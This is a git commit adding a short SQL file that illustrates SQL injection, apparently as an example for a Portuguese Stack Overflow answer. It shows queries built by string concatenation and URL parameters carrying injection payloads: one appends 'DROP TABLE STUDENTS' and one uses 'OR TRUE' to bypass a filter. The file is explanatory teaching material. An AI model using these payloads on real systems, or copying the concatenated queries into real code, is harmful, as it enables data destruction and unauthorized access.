36c16d132107702cdb94603103ecd17bf0929c88
Antonio Maniero <maniero@klip.net>
2019-10-30 11:25:41 -0300

    https://pt.stackoverflow.com/q/100729/101

---
+++ SQL/Select/Injection.sql
@@ -0,0 +1,17 @@
+query = "SELECT * FROM Students WHERE (nome = '" + GetByName + "' AND status = 'ativo')";
+
+http://site.com/Student?GetByName=Joao
+
+http://site.com/Student?GetByName=Robert');%20DROP%20TABLE%20STUDENTS;%20--
+
+SELECT * FROM Students WHERE (nome = 'Robert'); DROP TABLE STUDENTS; -- ' AND status = 'ativo')
+
+SELECT * FROM Students WHERE (nome = 'Robert');
+DROP TABLE STUDENTS;
+-- ' AND status = 'ativo')
+
+"SELECT * FROM Correntistas WHERE numConta = '" + numConta + "';"
+
+http://site.com/Correntistas?numConta=1%20OR%20TRUE
+
+//https://pt.stackoverflow.com/q/100729/101
